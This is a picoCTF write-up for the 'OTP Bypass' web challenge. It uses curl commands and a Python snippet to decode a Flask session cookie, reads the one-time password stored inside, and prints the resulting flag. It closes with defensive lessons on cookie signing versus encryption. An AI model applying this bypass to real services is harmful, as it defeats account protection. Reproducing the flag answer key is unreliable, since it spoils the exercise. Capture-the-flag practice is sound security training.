# OTP Bypass — picoCTF Writeup

## Challenge Info

| Field       | Details                                        |
|-------------|------------------------------------------------|
| Name        | OTP Bypass                                     |
| Category    | Web Exploitation                               |
| Platform    | picoCTF                                        |
| URL         | `http://titan.picoctf.net:58307/`              |

**Description:**
Can you get the flag?

---

## Solution

### Step 1: Explore the Website

The website presents a registration form built with Flask (Python/Werkzeug). There's no login page — only registration with fields for full name, username, phone number, city, and password.

```bash
curl -s http://titan.picoctf.net:58307/
```

---

### Step 2: Register an Account

Register with any data. The server sets a Flask session cookie and redirects to `/dashboard`:

```bash
# Get session and CSRF token
curl -s -c cookies.txt http://titan.picoctf.net:58307/ > /dev/null
CSRF=$(curl -s -b cookies.txt http://titan.picoctf.net:58307/ \
  | grep -o 'value="[^"]*"' | head -1 | cut -d'"' -f2)

# Register
curl -s -b cookies.txt -c cookies.txt -X POST http://titan.picoctf.net:58307/ \
  -d "csrf_token=$CSRF&full_name=test&username=test&phone_number=1234567890&city=NYC&password=pass123"
```

---

### Step 3: Encounter the 2FA Page

After registration, the `/dashboard` page requires a one-time password (OTP):

```html
<h2>2fa authentication</h2>
<form method="POST">
    <input type="text" name="otp" placeholder="Enter OTP">
    <button type="submit">Submit</button>
</form>
```

We don't have the OTP — no email or SMS was sent. So where is it?

---

### Step 4: Decode the Flask Session Cookie

Flask stores session data in a **client-side cookie** by default. The cookie is signed (to prevent tampering) but **not encrypted** — meaning we can read its contents.

The Flask session cookie format is: `base64(zlib_compress(json_data)).timestamp.signature`

Extract and decode it:

```bash
# View the cookie
cat cookies.txt
# session=.eJxlzL0OwjAMBO...

# Decode with Python
python3 -c "
import zlib, base64

cookie = '<paste cookie value before first dot>'
cookie += '=' * (4 - len(cookie) % 4)
decoded = zlib.decompress(base64.urlsafe_b64decode(cookie))
print(decoded.decode())
"
```

**Decoded session data:**

```json
{
  "city": "NYC",
  "csrf_token": "4fecf3eecc3b681fffb7399cb5ab5cb2590a9c50",
  "full_name": "test",
  "otp": "712185",
  "password": "pass123",
  "phone_number": "1234567890",
  "username": "test"
}
```

The OTP is stored right there in the session cookie: `"otp": "712185"`

---

### Step 5: Submit the OTP

```bash
curl -s -b cookies.txt -X POST http://titan.picoctf.net:58307/dashboard \
  -d 'otp=712185'
```

**Result:**

```
Welcome, test you sucessfully bypassed the OTP request.
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}
```

---

## Flag

```
picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}
```

---

## Key Takeaways

1. **Flask session cookies are readable.** By default, Flask stores session data in a client-side cookie. The cookie is **signed** (so you can't modify it without the secret key) but **not encrypted** (so anyone can read it). Sensitive data like OTP codes should never be stored in the session cookie.

2. **OTP must be validated server-side.** A proper 2FA implementation generates the OTP on the server, sends it through a separate channel (SMS, email, authenticator app), and validates it server-side. Storing the OTP in the client's session defeats the entire purpose of two-factor authentication.

3. **Always inspect cookies.** In web exploitation challenges, cookies are a common attack surface. Flask cookies in particular can be decoded to reveal sensitive information. Tools like `flask-unsign` can also be used to decode and even forge Flask session cookies if the secret key is known.

4. **Signed does not mean encrypted.** Signing prevents modification — it guarantees the data hasn't been tampered with. Encryption prevents reading — it guarantees the data can't be understood. These are two different properties. Flask's default sessions only provide signing, not encryption.
